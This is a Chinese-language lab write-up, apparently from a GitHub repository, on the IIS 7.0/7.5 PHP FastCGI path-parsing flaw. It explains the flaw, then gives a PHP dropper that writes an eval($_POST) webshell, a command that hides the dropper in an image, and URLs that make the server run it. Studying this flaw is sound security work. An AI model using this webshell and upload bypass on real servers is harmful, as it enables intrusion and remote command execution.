# IIS7.0/7.5解析漏洞

> IIS7.0/7.5本身没有解析漏洞，但是当IIS通过[FastCGI](https://baike.baidu.com/item/FastCGI)解析PHP语言时，由于FastCGI配置中的cgi.fix_pathinfo默认为1（即开启状态），导致在对文件进行解析时形成解析漏洞，因此，IIS7.0/7.5解析漏洞实际上是PHP FastCGI解析漏洞

## 漏洞原理

> 如果IIS7.0/7.5通过FastCGI的方式支持PHP解析，当访问`http://172.16.16.24/index.jpg/xx.php`时，$fastcgi_script_name会被设置为 `index.jpg/xx.php`，如果开启cgi.fix_pathinfo，PHP会认为SCRIPT_FILENAME是`index.jpg`，而`xx.php`是PATH_INFO，所以就会将`index.jpg`作为PHP文件来进行解析，从而形成解析漏洞

:pencil:**Thinking**  

> 通过上传点，上传一个包含木马的任意格式的文件，在菜刀连接时或者解析时，在完整访问路径下添加`/*.php`（无论`*.php`文件是否存在），该文件就会以PHP的形式进行解析

## 测试环境

- **操作系统**：Windows Server 2008 R2
- **应用服务**：IIS 7.5
- **解析语言**：PHP 7.2.17
- **测试时间**：2019/4/25

## 测试过程

### 0x01 漏洞测试

> 在IIS服务器下上传一个phpinfo文件，并以`.doc`命名

```php
<?php phpinfo();?>
```

![iis7.5_0001](https://github.com/GHlyanin/File-parsing-vulnerability/blob/master/IIS/IIS_7.0_7.5/image/iis7.5_0001.PNG)

> 在浏览器中访问如下路径，以`.doc`命名的PHP文件正常解析

```http
http://172.16.16.24/a.doc/.php
```

![iis7.5_0002](https://github.com/GHlyanin/File-parsing-vulnerability/blob/master/IIS/IIS_7.0_7.5/image/iis7.5_0002.PNG)

:pencil:**Thinking**  

> 此处对`.doc`、`.jpg`、`.txt`、`.asp`等格式的PHP文件进行了测试，均存在该解析漏洞

### 0x02 漏洞利用

> 通过上传点，上传一个图片木马，然后访问该图片木马，让其在本目录下生成一个shell.php，通过该方法可以绕过上传白名单检测，文件内容检测

**制作图片木马**

> 一张正常图片b.jpg和一个内容如下的a.txt

```php
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>
```

:pencil:**Thinking**  

> 该PHP的意义是：当该PHP文件解析时，会在相同目录下生成一个包含一句话木马的shell.php文件，其中写入的一句话木马可以根据实际环境进行修改。本实验采用的PHP版本大于7，在PHP7之后的版本，PHP语言做了更改，很多函数无法使用，所以PHP小于7的木马文件在本环境中很可能无法使用，并且菜刀在实现文件管理器的时候用的是assert函数，这导致菜刀没办法在PHP7上正常运行，由于蚁剑没有用到assert函数，所以本测试使用蚁剑作为一句话木马的文件管理器。

> 使用cmd中的copy命令生成图片木马，将文本写入图片的二进制代码之后，避免破坏图片头和尾

```
copy b.jpg/b + a.txt/a ab.jpg
```

![iis7.5_0003](https://github.com/GHlyanin/File-parsing-vulnerability/blob/master/IIS/IIS_7.0_7.5/image/iis7.5_0003.PNG)

**文件上传和解析**

> 把制作的图片木马上传至网站目录下，然后在浏览器中访问如下地址，会发现该图片木马正常解析，并在该图片相同目录下生成shell.php文件

```http
http://172.16.16.24/ab.jpg/.php
```

![iis7.5_0004](https://github.com/GHlyanin/File-parsing-vulnerability/blob/master/IIS/IIS_7.0_7.5/image/iis7.5_0004.PNG)

![iis7.5_0005](https://github.com/GHlyanin/File-parsing-vulnerability/blob/master/IIS/IIS_7.0_7.5/image/iis7.5_0005.PNG)

**蚁剑连接**

> 通过蚁剑连接shell.php，可以正常连接

![iis7.5_0006](https://github.com/GHlyanin/File-parsing-vulnerability/blob/master/IIS/IIS_7.0_7.5/image/iis7.5_0006.PNG)

:pencil:**Thinking**  

> 思考





























